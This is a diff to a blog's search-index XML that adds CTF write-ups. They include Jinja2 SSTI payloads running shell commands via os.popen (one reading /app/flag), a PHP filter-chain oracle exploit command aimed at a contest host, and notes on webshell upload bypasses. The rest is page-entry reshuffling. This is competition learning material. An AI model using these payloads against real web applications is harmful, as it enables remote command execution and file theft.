@@ -4,6 +4,45 @@
   
     
     <entry>
+      <title>西湖论剑</title>
+      <link href="/2025/01/18/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/"/>
+      <url>/2025/01/18/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Rank-l"><a href="#Rank-l" class="headerlink" title="Rank-l"></a>Rank-l</h1><p>登陆时可以发现其输入用户名和输入密码是在不同路径下的。</p><p>在经过尝试可以发现在登陆页面输入一次用户名,服务器会将其保存,后面输入密码时,如果错误会回显用户名<br><img src="/2025/01/18/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/IMG_20250118-163641406.png" class=""><br>因为是py所以尝试使用ssti<br><img src="/2025/01/18/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/IMG_20250118-163741888.png" class=""><br><img src="/2025/01/18/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/IMG_20250118-163756540.png" class="">  </p><p>经过尝试可以发现,在用户名处存在ssti<br>其过滤了一些特殊符号如/ * ;等。这里我使用equest.args.x1来进行绕过<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phone_number=&#123;&#123;g.pop.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(request.args.x1).read()&#125;&#125;phone_number=&#123;&#123;g.pop.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(request.args.x1).read()&#125;&#125;</span><br></pre></td></tr></table></figure><br><img src="/2025/01/18/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/IMG_20250118-162734268.png" class="">  </p><img src="/2025/01/18/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/IMG_20250118-163335604.png" class="">  <h1 id="easydatalog"><a href="#easydatalog" class="headerlink" title="easydatalog"></a>easydatalog</h1><p>下载查看日志<br><img src="/2025/01/18/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/IMG_20250118-164019396.png" class=""><br>可以发现其为使用蚁剑所记录的日志。<br>一步步看下去可以发现用蚁剑传了一张jpg图片。蚁剑传图片是分段传的将图片的多段拼接在一起。<br><img src="/2025/01/18/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/IMG_20250118-164201560.png" class="">  </p><p>得到如下图片<br><img src="/2025/01/18/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/IMG_20250118-164407354.jpg" class="">  </p><p>提取盲水印可以发现<br><img src="/2025/01/18/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/IMG_20250118-164505721.png" class="">  </p><p>再接着看日志可以发现还有一个zip文件<br><img src="/2025/01/18/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/IMG_20250118-164620152.png" class=""><br>提取出来使用盲水印的密码解压。<br><img src="/2025/01/18/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/IMG_20250118-164702770.png" class=""><br>得到csv文件<br><img src="/2025/01/18/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/IMG_20250118-164729780.png" class="">  </p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>chuqiubei</title>
+      <link href="/2025/01/17/chuqiubei/"/>
+      <url>/2025/01/17/chuqiubei/</url>
+      
+        <content type="html"><![CDATA[<h1 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h1><img src="/2025/01/17/chuqiubei/IMG_20250117-131104965.png" class="">  <p>登录框输入<code>&#123;&#123;7*7&#125;&#125;</code>发现是ssti，且变量可以从浏览器看出为user<br>直接ssti即可。<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=&#123;&#123;cycler.__init__.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /app/flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><br><img src="/2025/01/17/chuqiubei/IMG_20250117-131033194.png" class="">  </p><h1 id="file-copy"><a href="#file-copy" class="headerlink" title="file_copy"></a>file_copy</h1><img src="/2025/01/17/chuqiubei/IMG_20250117-185455391.png" class="">  <p>从报错可以看出其是使用copy函数来处理文件。<br>我们可以使用php_filter_chains_oracle_exploit一把梭<br><a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">https://github.com/synacktiv/php_filter_chains_oracle_exploit</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python filters_chain_oracle_exploit.py --target  http:<span class="comment">//eci-2zebps6z31jiqnksgy5t.cloudeci1.ichunqiu.com:80 --file /flag --parameter path</span></span><br></pre></td></tr></table></figure><img src="/2025/01/17/chuqiubei/IMG_20250117-151020161.png" class="">  <img src="/2025/01/17/chuqiubei/IMG_20250117-151033234.png" class="">  <p>flag{e3945414-f7af-4f0b-b926-5861b0c58339}</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>培训</title>
+      <link href="/2025/01/16/%E5%9F%B9%E8%AE%AD/"/>
+      <url>/2025/01/16/%E5%9F%B9%E8%AE%AD/</url>
+      
+        <content type="html"><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>所谓文件上传，其实就是上传文件道web服务器上，使得web服务器运行我们说上传的脚本文件，从而达到命令执行的功能。</p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>所谓webshell其实就是php,jsp,asp等后端恶意文件。在服务器被运行后可以利用http传参交互从而命令执行。</p><h2 id="造成文件上传漏洞的条件。"><a href="#造成文件上传漏洞的条件。" class="headerlink" title="造成文件上传漏洞的条件。"></a>造成文件上传漏洞的条件。</h2><p>1.webshell可以上传后安全落地<br>2.webshell会被执行(有些文件上传后的目录没有执行权限，就无法执行)<br>3.上传的目录可以访问。</p><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h3 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h3><p>web151</p><h3 id="大小写-php4-php5等"><a href="#大小写-php4-php5等" class="headerlink" title="大小写,php4,php5等"></a>大小写,php4,php5等</h3><p>PHP4,PHP5,php4,php5,Php,phtml</p><h3 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h3><h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><h3 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h3><h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><h2 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h2><p>XSS其实就是</p><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h1 id="ssti"><a href="#ssti" class="headerlink" title="ssti"></a>ssti</h1>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>软件系统安全赛</title>
       <link href="/2025/01/05/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B/"/>
       <url>/2025/01/05/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B/</url>
@@ -2625,10 +2664,10 @@
     
     <entry>
       <title></title>
-      <link href="/css/modify.css"/>
-      <url>/css/modify.css</url>
+      <link href="/js/LSE.js"/>
+      <url>/js/LSE.js</url>
       
-        <content type="html"><![CDATA[#page-header {  background: transparent !important;}#page-header.post-bg,#page-header.not-home-page {  height: 280px !important;}#page-header #post-info {  bottom: 40px !important;  text-align: center;}#page-header #page-site-info {  top: 140px !important;}@media screen and (max-width: 768px) {  #page-header.not-home-page {    height: 200px !important;  }  #page-header #post-info {    bottom: 10px !important;  }  #page-header #page-site-info {    top: 100px !important;  }}.top-img {  height: 250px;  margin: -50px -40px 50px;  border-top-left-radius: inherit;  border-top-right-radius: inherit;  background-position: center center;  background-size: cover;  -webkit-transition: all 0.3s;  -moz-transition: all 0.3s;  -o-transition: all 0.3s;  -ms-transition: all 0.3s;  transition: all 0.3s;}@media screen and (max-width: 768px) {  .top-img {    height: 230px;    margin: -36px -14px 36px;  }}[data-theme='dark'] .top-img {  filter: brightness(0.8);}#footer:before {  background-color: rgba(255,255,255,0.5);}[data-theme='dark'] #footer:before {  background-color: rgba(0,0,0,0.5);}#footer-wrap,#footer-wrap a {  color: #111;  -webkit-transition: unset;  -moz-transition: unset;  -o-transition: unset;  -ms-transition: unset;  transition: unset;}[data-theme='dark'] #footer-wrap,[data-theme='dark'] #footer-wrap a {  color: var(--light-grey);}]]></content>
+        <content type="html"><![CDATA[]]></content>
       
     </entry>
     
@@ -2638,17 +2677,6 @@
       <title>这就是（一个平平无奇的大学生的）分类</title>
       <link href="/categories/index.html"/>
       <url>/categories/index.html</url>
-      
-        <content type="html"><![CDATA[]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title></title>
-      <link href="/js/LSE.js"/>
-      <url>/js/LSE.js</url>
       
         <content type="html"><![CDATA[]]></content>
       
@@ -2690,11 +2718,11 @@
     
     
     <entry>
-      <title>友情链接</title>
-      <link href="/link/index.html"/>
-      <url>/link/index.html</url>
+      <title></title>
+      <link href="/css/modify.css"/>
+      <url>/css/modify.css</url>
       
-        <content type="html"><![CDATA[]]></content>
+        <content type="html"><![CDATA[#page-header {  background: transparent !important;}#page-header.post-bg,#page-header.not-home-page {  height: 280px !important;}#page-header #post-info {  bottom: 40px !important;  text-align: center;}#page-header #page-site-info {  top: 140px !important;}@media screen and (max-width: 768px) {  #page-header.not-home-page {    height: 200px !important;  }  #page-header #post-info {    bottom: 10px !important;  }  #page-header #page-site-info {    top: 100px !important;  }}.top-img {  height: 250px;  margin: -50px -40px 50px;  border-top-left-radius: inherit;  border-top-right-radius: inherit;  background-position: center center;  background-size: cover;  -webkit-transition: all 0.3s;  -moz-transition: all 0.3s;  -o-transition: all 0.3s;  -ms-transition: all 0.3s;  transition: all 0.3s;}@media screen and (max-width: 768px) {  .top-img {    height: 230px;    margin: -36px -14px 36px;  }}[data-theme='dark'] .top-img {  filter: brightness(0.8);}#footer:before {  background-color: rgba(255,255,255,0.5);}[data-theme='dark'] #footer:before {  background-color: rgba(0,0,0,0.5);}#footer-wrap,#footer-wrap a {  color: #111;  -webkit-transition: unset;  -moz-transition: unset;  -o-transition: unset;  -ms-transition: unset;  transition: unset;}[data-theme='dark'] #footer-wrap,[data-theme='dark'] #footer-wrap a {  color: var(--light-grey);}]]></content>
       
     </entry>
     
@@ -2704,6 +2732,17 @@
       <title>一个普通大学生的标签页</title>
       <link href="/tag/index.html"/>
       <url>/tag/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>友情链接</title>
+      <link href="/link/index.html"/>
+      <url>/link/index.html</url>
       
         <content type="html"><![CDATA[]]></content>
       
